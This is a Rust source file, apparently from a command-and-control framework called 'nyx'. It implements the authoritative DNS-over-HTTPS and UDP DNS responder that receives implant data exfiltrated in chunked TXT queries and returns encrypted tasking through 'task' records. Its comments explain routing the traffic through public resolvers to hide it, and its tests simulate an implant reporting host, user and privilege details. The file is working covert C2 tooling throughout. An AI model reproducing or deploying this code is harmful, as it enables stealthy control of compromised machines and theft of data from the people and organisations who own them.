//! Authoritative DNS responder for the DoH DNS C2 channel (spec-2).
//!
//! The transport crate's [`DohDnsTransport`] is a beacon-side *client*: it
//! exfils frame chunks as TXT queries (`c{seq}-{i}.{labels}.{domain}`),
//! polls `task.{domain}` for sealed replies, and probes `health.{domain}` A
//! records. This module is the server half — an authoritative responder for
//! `{domain}` with two serving paths:
//!
//! 1. **HTTP JSON DoH endpoint** (`POST /dns-query`, RFC 8484 `dns-json`) —
//!    the transport client talks to this directly when `doh_server` points
//!    at the team server (also the path unit-tested here).
//! 2. **UDP/53 wire responder** (`NYX_DOH_UDP_ADDR`, default `0.0.0.0:53`) —
//!    for real-world NS delegation: an operator delegates `{domain}` to this
//!    server's IP, and public DoH resolvers (Cloudflare/Google) recurse here.
//!
//! Both paths feed the same state machine:
//!
//! ```text
//!   TXT c{seq}-{i}.{b64}.{domain}  →  chunk reassembly  →  parse_frame
//!        →  handle_frame (the SAME channel-agnostic beacon core as /beacon)
//!        →  sealed reply buffered keyed by session pubkey
//!   TXT task.{domain}               →  buffered reply served (base64)
//!   A   health.{domain}             →  canary A record (latency probe)
//! ```
//!
//! ## Multi-session note
//!
//! `task.{domain}` carries no per-session identity, so the responder serves
//! replies round-robin: the freshest buffered reply with the fewest serves
//! wins, and every reply expires after [`REPLY_TTL`] or [`REPLY_MAX_SERVES`].
//! A session that receives a frame it cannot open (wrong session key) simply
//! keeps polling. DNS is the low-bandwidth channel by design; operators
//! running multiple DoH beacons should use one domain per beacon.
//!
//! ## Reply size budget
//!
//! A TXT character-string is capped at 255 bytes by RFC 1035 §3.3.14, and the
//! transport client base64-decodes a single `data` string, so a reply larger
//! than `floor(255 / 4) * 3 = 189` bytes cannot be delivered over this
//! channel. Larger replies are dropped with a warning (the beacon's next
//! check-in over its fallback channel re-syncs). Uploads are not affected:
//! they are chunked at 160 bytes by the client.

use std::net::SocketAddr;
use std::sync::Arc;
use std::time::{Duration, Instant};

use base64::engine::general_purpose::URL_SAFE_NO_PAD as B64;
use base64::Engine;
use dashmap::DashMap;

use crate::AppState;

// ---- Constants -------------------------------------------------------------

/// A chunk upload assembly times out after this long (a beacon that dies
/// mid-frame must not pin memory forever).
const CHUNK_TTL: Duration = Duration::from_secs(300);
/// A buffered reply is served for at most this long.
const REPLY_TTL: Duration = Duration::from_secs(30);
/// A buffered reply is served at most this many times (multi-session
/// round-robin fairness) before being dropped.
const REPLY_MAX_SERVES: u32 = 20;
/// Upper bound on chunk indices per sequence (client chunks a ≤10 KiB frame
/// at 160 B → ≤64 chunks; anything beyond that is not our client).
const MAX_CHUNKS_PER_SEQ: usize = 64;
/// Largest single TXT character-string payload that still round-trips through
/// the client's base64 decode (255-byte RDATA string cap).
const MAX_TXT_REPLY: usize = 189;
/// DNS record types.
const TYPE_A: u16 = 1;
const TYPE_TXT: u16 = 16;
/// Canary A record for `health.{domain}` — TEST-NET-1 (RFC 5737), never
/// routable, which is fine: the client only measures round-trip time.
const HEALTH_A: [u8; 4] = [192, 0, 2, 1];

// ---- State -----------------------------------------------------------------

/// Per-sequence chunk assembly buffer.
struct ChunkAcc {
    parts: Vec<Option<Vec<u8>>>,
    updated: Instant,
}

/// A sealed reply frame buffered for `task.{domain}` delivery.
#[derive(Clone)]
struct Reply {
    frame: Vec<u8>,
    created: Instant,
    serves: u32,
}

/// Server-side DoH/DNS channel state. Owned by `AppState.doh`; created at
/// boot when `NYX_DOH_DOMAIN` is set.
pub struct DohState {
    /// C2-controlled zone, e.g. `c2.example.com`. Queries are authoritative
    /// only inside this zone.
    pub domain: String,
    chunks: DashMap<u64, ChunkAcc>,
    replies: DashMap<[u8; 32], Reply>,
}

impl DohState {
    pub fn new(domain: String) -> Self {
        Self {
            domain,
            chunks: DashMap::new(),
            replies: DashMap::new(),
        }
    }
}

/// The result of answering a DNS question.
#[derive(Debug)]
pub enum DohAnswer {
    /// A TXT answer to serve (raw bytes, not yet base64 — the serving path
    /// encodes it for its wire format).
    Txt(Vec<u8>),
    /// An A record answer.
    A([u8; 4]),
    /// No data for this name/type (Status 0, empty answer — the client keeps
    /// polling).
    NoData,
}

/// Answer a DNS question from either serving path.
///
/// `name` is the question name WITHOUT the trailing root dot, in its ORIGINAL
/// case. DNS names are case-insensitive, so `task.`/`health.` and the domain
/// suffix are compared case-insensitively — but chunk payload labels are
/// base64url, which is case-SENSITIVE, so the prefix is never lower-cased
/// (the HTTP handler and UDP path both pass the raw name). `qtype` is the
/// wire record type. `peer` is the requester's address (used as the session
/// address when a chunk upload completes a new session).
pub fn handle_query(st: &AppState, name: &str, qtype: u16, peer: SocketAddr) -> DohAnswer {
    let Some(doh) = &st.doh else {
        return DohAnswer::NoData;
    };
    let domain = doh.domain.trim_end_matches('.').to_ascii_lowercase();
    let name_l = name.to_ascii_lowercase();

    // Health canary: `health.{domain}` A.
    if qtype == TYPE_A && name_l == format!("health.{domain}") {
        return DohAnswer::A(HEALTH_A);
    }

    // Task poll: `task.{domain}` TXT.
    if qtype == TYPE_TXT && name_l == format!("task.{domain}") {
        return match serve_reply(doh) {
            Some(frame) => DohAnswer::Txt(frame),
            None => DohAnswer::NoData,
        };
    }

    // Chunk upload: `c{seq}-{i}.{labels...}.{domain}` TXT. The client ignores
    // the response for uploads, so NoData (empty answer) is correct.
    if qtype == TYPE_TXT && name_l.ends_with(&format!(".{domain}")) {
        if let Some((seq, idx, b64)) = parse_chunk_name(name, &domain) {
            ingest_chunk(st, doh, seq, idx, &b64, peer);
        }
    }

    DohAnswer::NoData
}

/// Parse a chunk-upload question name into `(seq, chunk_index, b64_payload)`.
///
/// Name shape: `c{seq}-{i}.{b64_label_1}.{b64_label_2}...{domain}` (the
/// client splits each 160-byte chunk into ≤63-char base64url labels). The
/// prefix is case-preserved (base64url is case-sensitive); only the domain
/// suffix comparison is case-insensitive.
fn parse_chunk_name(name: &str, domain: &str) -> Option<(u64, usize, String)> {
    let lower = name.to_ascii_lowercase();
    let suffix = format!(".{domain}");
    let pos = lower.rfind(&suffix)?;
    if pos + suffix.len() != lower.len() {
        return None; // domain suffix must be the terminal labels
    }
    let prefix = &name[..pos];
    let mut labels = prefix.split('.');
    let head = labels.next()?;
    let (seq_s, idx_s) = head.split_once('-')?;
    if !seq_s.starts_with('c') {
        return None;
    }
    let seq: u64 = seq_s[1..].parse().ok()?;
    let idx: usize = idx_s.parse().ok()?;
    if idx >= MAX_CHUNKS_PER_SEQ {
        return None;
    }
    // Rejoin the base64 labels — the client splits one base64 string across
    // labels, so joining reproduces it exactly (base64url has no '.').
    let b64: String = labels.collect();
    if b64.is_empty() || b64.len() > 253 {
        return None;
    }
    Some((seq, idx, b64))
}

/// Ingest one uploaded chunk; when the sequence becomes contiguous, assemble
/// the frame and push it through the standard beacon funnel.
fn ingest_chunk(st: &AppState, doh: &DohState, seq: u64, idx: usize, b64: &str, peer: SocketAddr) {
    // Lazy sweep of expired assemblies (bounded work per upload).
    let now = Instant::now();
    let expired: Vec<u64> = doh
        .chunks
        .iter()
        .filter(|e| now.duration_since(e.value().updated) > CHUNK_TTL)
        .map(|e| *e.key())
        .collect();
    for k in expired {
        doh.chunks.remove(&k);
    }

    let Ok(data) = B64.decode(b64) else {
        return; // not our client (or corrupted label) — ignore
    };
    // Sanity: one chunk of our client is ≤160 bytes.
    if data.is_empty() || data.len() > 160 {
        return;
    }

    let mut entry = doh.chunks.entry(seq).or_insert_with(|| ChunkAcc {
        parts: Vec::new(),
        updated: now,
    });
    entry.updated = now;
    if entry.parts.len() <= idx {
        entry.parts.resize(idx + 1, None);
    }
    entry.parts[idx] = Some(data);

    // Assemble only when the parts are contiguous from index 0.
    let mut frame = Vec::new();
    for part in &entry.parts {
        match part {
            Some(bytes) => frame.extend_from_slice(bytes),
            None => return, // gap — keep waiting
        }
    }
    drop(entry);
    doh.chunks.remove(&seq); // consumed

    // Push through the same channel-agnostic funnel as /beacon. A frame that
    // fails to parse is garbage (or from a different zone's delegation) —
    // drop it and keep serving.
    let Ok(raw) = nyx_protocol::parse_frame(&frame) else {
        tracing::debug!(target: "nyx::doh", %peer, seq, bytes = frame.len(), "DoH chunk assembly failed frame parse");
        return;
    };
    match crate::handle_frame(st, &peer, &raw) {
        Ok(reply) => {
            if reply.len() <= MAX_TXT_REPLY {
                doh.replies.insert(
                    raw.pubkey,
                    Reply {
                        frame: reply,
                        created: Instant::now(),
                        serves: 0,
                    },
                );
            } else {
                // The reply cannot ride a single TXT string; the beacon's next
                // fallback check-in re-syncs. Log so operators see the drop.
                tracing::warn!(
                    target: "nyx::doh",
                    bytes = reply.len(),
                    max = MAX_TXT_REPLY,
                    "DoH reply too large for TXT delivery; dropped (use a higher-bandwidth channel for this task)"
                );
            }
        }
        Err(e) => {
            tracing::warn!(target: "nyx::doh", %peer, error = %e, "DoH frame handling failed");
        }
    }
}

/// Pop the freshest deliverable reply (round-robin by serve count).
fn serve_reply(doh: &DohState) -> Option<Vec<u8>> {
    let now = Instant::now();
    // Collect candidates outside the iterator (DashMap forbids mutation while
    // iterating).
    let mut candidates: Vec<([u8; 32], Reply)> = doh
        .replies
        .iter()
        .filter(|e| now.duration_since(e.value().created) <= REPLY_TTL)
        .map(|e| (*e.key(), e.value().clone()))
        .collect();
    if candidates.is_empty() {
        return None;
    }
    candidates.sort_by_key(|(_, r)| (r.serves, r.created));
    let (key, mut reply) = candidates.remove(0);
    reply.serves += 1;
    let frame = reply.frame.clone();
    if reply.serves >= REPLY_MAX_SERVES {
        doh.replies.remove(&key);
    } else {
        doh.replies.insert(key, reply);
    }
    Some(frame)
}

// ---- HTTP JSON DoH endpoint (RFC 8484 dns-json) ----------------------------

/// `POST /dns-query` handler — the serving path the transport client uses
/// directly (it POSTs `{"name": "...", "type": 16}` with
/// `Content-Type: application/dns-json`).
pub async fn doh_query_handler(
    axum::extract::State(st): axum::extract::State<Arc<AppState>>,
    axum::extract::ConnectInfo(peer): axum::extract::ConnectInfo<SocketAddr>,
    body: axum::body::Bytes,
) -> axum::response::Response {
    let parsed: serde_json::Value = match serde_json::from_slice(&body) {
        Ok(v) => v,
        Err(_) => return json_response(&serde_json::json!({"Status": 2})), // SERVFAIL
    };
    let Some(name) = parsed.get("name").and_then(|n| n.as_str()) else {
        return json_response(&serde_json::json!({"Status": 2}));
    };
    let qtype = parsed
        .get("type")
        .and_then(|t| t.as_u64())
        .unwrap_or(TYPE_TXT as u64) as u16;
    let name = name.trim_end_matches('.');

    match handle_query(&st, name, qtype, peer) {
        DohAnswer::Txt(bytes) => {
            let data = B64.encode(&bytes);
            json_response(&serde_json::json!({
                "Status": 0,
                "Answer": [{
                    "name": name,
                    "type": TYPE_TXT,
                    "TTL": 60,
                    "data": data,
                }],
            }))
        }
        DohAnswer::A(ip) => {
            let ip_str = format!("{}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3]);
            json_response(&serde_json::json!({
                "Status": 0,
                "Answer": [{
                    "name": name,
                    "type": TYPE_A,
                    "TTL": 60,
                    "data": ip_str,
                }],
            }))
        }
        DohAnswer::NoData => json_response(&serde_json::json!({"Status": 0})),
    }
}

fn json_response(v: &serde_json::Value) -> axum::response::Response {
    let mut resp = axum::response::Response::new(axum::body::Body::from(v.to_string()));
    *resp.status_mut() = axum::http::StatusCode::OK;
    resp.headers_mut().insert(
        axum::http::header::CONTENT_TYPE,
        axum::http::HeaderValue::from_static("application/dns-json"),
    );
    resp
}

// ---- UDP/53 wire responder --------------------------------------------------

/// Spawn the authoritative UDP DNS responder. `bind` is the socket address
/// (e.g. `0.0.0.0:53`). Runs forever; logs a warning on socket failure.
pub fn spawn_udp_responder(state: Arc<AppState>, bind: String) {
    tokio::spawn(async move {
        let sock = match tokio::net::UdpSocket::bind(&bind).await {
            Ok(s) => s,
            Err(e) => {
                tracing::error!(
                    target: "nyx::doh",
                    %bind, error = %e,
                    "DoH UDP responder failed to bind; DNS-over-UDP disabled \
                     (set NYX_DOH_UDP_ADDR to a bindable address)"
                );
                return;
            }
        };
        tracing::info!(target: "nyx::doh", %bind, "DoH UDP responder listening (authoritative DNS)");
        let mut buf = vec![0u8; 4096];
        loop {
            let (n, src) = match sock.recv_from(&mut buf).await {
                Ok(x) => x,
                Err(e) => {
                    tracing::warn!(target: "nyx::doh", error = %e, "UDP recv error");
                    continue;
                }
            };
            let resp = match answer_wire_query(&state, &buf[..n], src) {
                Some(bytes) => bytes,
                None => continue, // malformed query — drop
            };
            if let Err(e) = sock.send_to(&resp, src).await {
                tracing::debug!(target: "nyx::doh", %src, error = %e, "UDP send failed");
            }
        }
    });
}

/// Answer one wire-format DNS query. Returns the wire-format response, or
/// `None` when the query is malformed (FORMERR is still served for a
/// parseable header with a bad question count — a truncated packet is
/// dropped entirely).
fn answer_wire_query(st: &AppState, query: &[u8], peer: SocketAddr) -> Option<Vec<u8>> {
    let (id, qname, qtype, qclass, qend) = parse_wire_query(query)?;
    let response = handle_query(st, &qname, qtype, peer);

    let mut out = Vec::with_capacity(query.len() + 64);
    // Header: id, flags (QR|AA, echo RD; NXDOMAIN sets RCODE=3).
    let rcode: u16 = match response {
        DohAnswer::NoData => 3, // NXDOMAIN — the authoritative answer for a zone we don't serve
        _ => 0,
    };
    out.extend_from_slice(&id.to_be_bytes());
    out.extend_from_slice(&(0x8400 | (u16::from(query[2]) & 0x01) | rcode).to_be_bytes());
    out.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ANCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT

    // Question echo (re-encode uncompressed — resolvers accept it).
    encode_wire_name(&qname, &mut out);
    out.extend_from_slice(&qtype.to_be_bytes());
    out.extend_from_slice(&qclass.to_be_bytes());

    // Answer section (compute ANCOUNT before the match moves `response`).
    let has_answer = matches!(response, DohAnswer::Txt(_) | DohAnswer::A(_));
    match response {
        DohAnswer::Txt(bytes) => {
            let data = B64.encode(&bytes);
            if data.len() > 255 {
                // Cannot fit a TXT character-string; serve an empty answer.
                return Some(out);
            }
            out.extend_from_slice(&[0xC0, 0x0C]); // name: pointer to qname
            out.extend_from_slice(&TYPE_TXT.to_be_bytes());
            out.extend_from_slice(&1u16.to_be_bytes()); // class IN
            out.extend_from_slice(&60u32.to_be_bytes()); // TTL
            out.extend_from_slice(&((data.len() + 1) as u16).to_be_bytes()); // RDLENGTH
            out.push(data.len() as u8);
            out.extend_from_slice(data.as_bytes());
        }
        DohAnswer::A(ip) => {
            out.extend_from_slice(&[0xC0, 0x0C]);
            out.extend_from_slice(&TYPE_A.to_be_bytes());
            out.extend_from_slice(&1u16.to_be_bytes());
            out.extend_from_slice(&60u32.to_be_bytes());
            out.extend_from_slice(&4u16.to_be_bytes());
            out.extend_from_slice(&ip);
        }
        DohAnswer::NoData => {}
    }
    // Patch ANCOUNT (1 when we appended an answer).
    out[6..8].copy_from_slice(&(has_answer as u16).to_be_bytes());
    // qend unused beyond validation; keep the slice tidy.
    let _ = qend;
    Some(out)
}

/// Parse a DNS wire-format query: returns `(id, qname, qtype, qclass, end)`.
/// Handles label compression pointers in the qname (queries rarely use them,
/// but a resolver may compress a repeated suffix).
fn parse_wire_query(buf: &[u8]) -> Option<(u16, String, u16, u16, usize)> {
    if buf.len() < 12 {
        return None;
    }
    let id = u16::from_be_bytes([buf[0], buf[1]]);
    let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
    if qdcount != 1 {
        return None;
    }
    let (name, mut off) = parse_wire_name(buf, 12)?;
    if buf.len() < off + 4 {
        return None;
    }
    let qtype = u16::from_be_bytes([buf[off], buf[off + 1]]);
    let qclass = u16::from_be_bytes([buf[off + 2], buf[off + 3]]);
    off += 4;
    Some((id, name, qtype, qclass, off))
}

/// Parse a wire-format domain name starting at `off`. Returns the name
/// (case-preserved, no trailing dot) and the offset just past it. Compression
/// pointers jump backwards within `buf`; a pointer loop is rejected. Case is
/// preserved on purpose: chunk payload labels are base64url (case-sensitive),
/// and `handle_query` does case-insensitive matching for the fixed labels.
fn parse_wire_name(buf: &[u8], off: usize) -> Option<(String, usize)> {
    let mut labels: Vec<String> = Vec::new();
    let mut pos = off;
    let mut end: Option<usize> = None;
    let mut hops = 0;
    loop {
        if pos >= buf.len() || hops > 64 {
            return None;
        }
        let len = buf[pos] as usize;
        if len == 0 {
            if end.is_none() {
                end = Some(pos + 1);
            }
            break;
        }
        if len & 0xC0 == 0xC0 {
            // Compression pointer: 14-bit offset into the message.
            if pos + 1 >= buf.len() {
                return None;
            }
            let target = ((len & 0x3F) << 8) | buf[pos + 1] as usize;
            if end.is_none() {
                end = Some(pos + 2);
            }
            // RFC 1035 §4.1.4 pointers normally target a PRIOR occurrence,
            // but forward pointers are legal; the hops cap below rejects any
            // pointer loop either way.
            if target >= buf.len() {
                return None;
            }
            pos = target;
            hops += 1;
            continue;
        }
        if len & 0xC0 != 0 {
            return None; // reserved label type
        }
        if pos + 1 + len > buf.len() {
            return None;
        }
        labels.push(String::from_utf8_lossy(&buf[pos + 1..pos + 1 + len]).into_owned());
        pos += 1 + len;
    }
    Some((labels.join("."), end?))
}

/// Encode a domain name into wire format (uncompressed).
fn encode_wire_name(name: &str, out: &mut Vec<u8>) {
    for label in name.split('.') {
        out.push(label.len() as u8);
        out.extend_from_slice(label.as_bytes());
    }
    out.push(0);
}

// ---- Tests ------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use nyx_protocol::{
        encode_frame_dir, wire::Writer, Direction, ImplantKeypair, ServerKeypair, SessionInfo,
    };

    fn test_state() -> (Arc<AppState>, ServerKeypair) {
        let kp = ServerKeypair::generate().unwrap();
        let st = AppState {
            keypair: kp.clone(),
            doh: Some(DohState::new("c2.test".into())),
            ..AppState::default()
        };
        (Arc::new(st), kp)
    }

    fn seal_checkin(server_kp: &ServerKeypair) -> (Vec<u8>, [u8; 32], nyx_protocol::SessionKey) {
        let ikp = ImplantKeypair::generate().unwrap();
        let pubkey = ikp.public_bytes();
        let key = ikp.session_key(&server_kp.public_bytes()).unwrap();
        let mut w = Writer::new();
        SessionInfo {
            beacon_id: 7,
            hostname: "doh-test-host".into(),
            username: "tester".into(),
            os: "linux".into(),
            arch: 2,
            pid: 4242,
            is_admin: 0,
            auth_token: None,
        }
        .encode(&mut w)
        .unwrap();
        let frame =
            encode_frame_dir(&pubkey, Direction::ClientToServer, 0, &key, &w.into_bytes()).unwrap();
        (frame, pubkey, key)
    }

    #[test]
    fn parse_chunk_name_variants() {
        // Canonical form.
        let (seq, idx, b64) = parse_chunk_name("c3-2.AB.CDEF.c2.test", "c2.test").unwrap();
        assert_eq!((seq, idx), (3, 2));
        assert_eq!(b64, "ABCDEF");
        // Domain suffix must be terminal and case-insensitive.
        assert!(parse_chunk_name("c0-0.A.c2.TEST", "c2.test").is_some());
        assert!(parse_chunk_name("c0-0.A.c2.test.evil.com", "c2.test").is_none());
        // Malformed heads.
        assert!(parse_chunk_name("x0-0.A.c2.test", "c2.test").is_none());
        assert!(parse_chunk_name("c0.A.c2.test", "c2.test").is_none());
        assert!(parse_chunk_name("c-1.A.c2.test", "c2.test").is_none());
        // Out-of-range index.
        assert!(
            parse_chunk_name(&format!("c0-{}.A.c2.test", MAX_CHUNKS_PER_SEQ), "c2.test").is_none()
        );
    }

    #[test]
    fn chunk_upload_roundtrip_creates_session_and_reply() {
        let (st, kp) = test_state();
        let (frame, pubkey, _key) = seal_checkin(&kp);

        // Upload the frame in 160-byte chunks exactly like DohDnsTransport.
        let seq = 0u64;
        let chunks: Vec<&[u8]> = frame.chunks(160).collect();
        for (i, chunk) in chunks.iter().enumerate() {
            let b64 = B64.encode(chunk);
            // Re-split the b64 into ≤63-char labels like the client does.
            let mut labels: Vec<&str> = Vec::new();
            let mut rest = b64.as_str();
            while !rest.is_empty() {
                let split = rest.len().min(63);
                labels.push(&rest[..split]);
                rest = &rest[split..];
            }
            let name = format!("c{seq}-{i}.{}.c2.test", labels.join("."));
            assert!(name.len() <= 253, "query name too long: {name}");
            // Deliberately mixed-case b64 payload: the responder must NOT
            // lowercase the payload labels (base64url is case-sensitive).
            let answer = handle_query(&st, &name, TYPE_TXT, "10.0.0.9:5300".parse().unwrap());
            assert!(matches!(answer, DohAnswer::NoData));
        }

        // The session now exists and a reply is buffered for the pubkey.
        assert!(
            st.sessions.contains_key(&pubkey),
            "session must exist after DoH upload"
        );
        let doh = st.doh.as_ref().unwrap();
        assert!(
            doh.replies.get(&pubkey).is_some(),
            "reply must be buffered after DoH check-in"
        );

        // task.{domain} poll serves the reply (base64 TXT).
        let answer = handle_query(
            &st,
            "task.c2.test",
            TYPE_TXT,
            "10.0.0.9:5300".parse().unwrap(),
        );
        match answer {
            DohAnswer::Txt(bytes) => {
                // The served bytes must be a valid server→client frame: it
                // parses and opens with the session key.
                let raw = nyx_protocol::parse_frame(&bytes).unwrap();
                assert_eq!(raw.pubkey, pubkey);
                assert!(
                    nyx_protocol::open_frame_dir(&_key, Direction::ServerToClient, &raw).is_ok()
                );
            }
            other => panic!("expected Txt answer, got {other:?}"),
        }

        // health.{domain} A canary.
        match handle_query(
            &st,
            "health.c2.test",
            TYPE_A,
            "10.0.0.9:5300".parse().unwrap(),
        ) {
            DohAnswer::A(ip) => assert_eq!(ip, HEALTH_A),
            other => panic!("expected A answer, got {other:?}"),
        }

        // Unknown names → NoData (NXDOMAIN on the wire path).
        assert!(matches!(
            handle_query(
                &st,
                "nope.c2.test",
                TYPE_TXT,
                "10.0.0.9:5300".parse().unwrap()
            ),
            DohAnswer::NoData
        ));
    }

    #[test]
    fn wire_query_roundtrip() {
        let (st, _kp) = test_state();
        // Build a wire query for health.c2.test A (uncompressed qname).
        let mut q = Vec::new();
        q.extend_from_slice(&0x1234u16.to_be_bytes()); // id
        q.extend_from_slice(&0x0100u16.to_be_bytes()); // RD
        q.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
        q.extend_from_slice(&0u16.to_be_bytes());
        q.extend_from_slice(&0u16.to_be_bytes());
        q.extend_from_slice(&0u16.to_be_bytes());
        for label in ["health", "c2", "test"] {
            q.push(label.len() as u8);
            q.extend_from_slice(label.as_bytes());
        }
        q.push(0);
        q.extend_from_slice(&TYPE_A.to_be_bytes());
        q.extend_from_slice(&1u16.to_be_bytes());

        let resp = answer_wire_query(&st, &q, "10.0.0.9:5300".parse().unwrap()).unwrap();
        // Header: id echoed, QR|AA set, ANCOUNT=1.
        assert_eq!(&resp[0..2], &0x1234u16.to_be_bytes());
        assert_eq!(resp[2] & 0x80, 0x80, "QR bit must be set");
        assert_eq!(u16::from_be_bytes([resp[6], resp[7]]), 1, "ANCOUNT=1");
        // Answer name is a pointer to offset 12 (answer starts 16 bytes
        // before the 4-byte RDATA tail: name ptr + type + class + TTL + RDLEN).
        assert_eq!(&resp[resp.len() - 16..resp.len() - 14], &[0xC0, 0x0C]);
        assert_eq!(
            &resp[resp.len() - 14..resp.len() - 12],
            &TYPE_A.to_be_bytes()
        );
        // RDATA is the 4-byte canary IP.
        assert_eq!(&resp[resp.len() - 4..], &HEALTH_A);

        // NXDOMAIN for unknown names.
        let mut q2 = Vec::new();
        q2.extend_from_slice(&0x5678u16.to_be_bytes());
        q2.extend_from_slice(&0x0100u16.to_be_bytes());
        q2.extend_from_slice(&1u16.to_be_bytes());
        q2.extend_from_slice(&0u16.to_be_bytes());
        q2.extend_from_slice(&0u16.to_be_bytes());
        q2.extend_from_slice(&0u16.to_be_bytes());
        for label in ["nope", "c2", "test"] {
            q2.push(label.len() as u8);
            q2.extend_from_slice(label.as_bytes());
        }
        q2.push(0);
        q2.extend_from_slice(&TYPE_TXT.to_be_bytes());
        q2.extend_from_slice(&1u16.to_be_bytes());
        let resp = answer_wire_query(&st, &q2, "10.0.0.9:5300".parse().unwrap()).unwrap();
        assert_eq!(resp[3] & 0x0F, 3, "RCODE must be NXDOMAIN");
        assert_eq!(u16::from_be_bytes([resp[6], resp[7]]), 0, "ANCOUNT=0");

        // Malformed (truncated) → None.
        assert!(answer_wire_query(&st, &q[..10], "10.0.0.9:5300".parse().unwrap()).is_none());
    }

    #[test]
    fn wire_query_handles_compression_pointer() {
        let mut q = Vec::new();
        q.extend_from_slice(&0x0001u16.to_be_bytes());
        q.extend_from_slice(&0x0100u16.to_be_bytes());
        q.extend_from_slice(&1u16.to_be_bytes());
        q.extend_from_slice(&0u16.to_be_bytes());
        q.extend_from_slice(&0u16.to_be_bytes());
        q.extend_from_slice(&0u16.to_be_bytes());
        // "a.b.c2.test" with the ".c2.test" suffix compressed as a pointer
        // to a previously-seen copy at offset 40.
        for label in ["a", "b"] {
            q.push(label.len() as u8);
            q.extend_from_slice(label.as_bytes());
        }
        q.push(0xC0);
        q.push(40);
        q.extend_from_slice(&TYPE_TXT.to_be_bytes());
        q.extend_from_slice(&1u16.to_be_bytes());
        // The pointed-to suffix: "\x02c2\x04test\x00" at offset 40.
        q.resize(53, 0);
        q[40] = 2;
        q[41..43].copy_from_slice(b"c2");
        q[43] = 4;
        q[44..48].copy_from_slice(b"test");
        q[48] = 0;

        let (id, name, qtype, qclass, _end) = parse_wire_query(&q).unwrap();
        assert_eq!(id, 1);
        assert_eq!(name, "a.b.c2.test");
        assert_eq!(qtype, TYPE_TXT);
        assert_eq!(qclass, 1);
    }
}
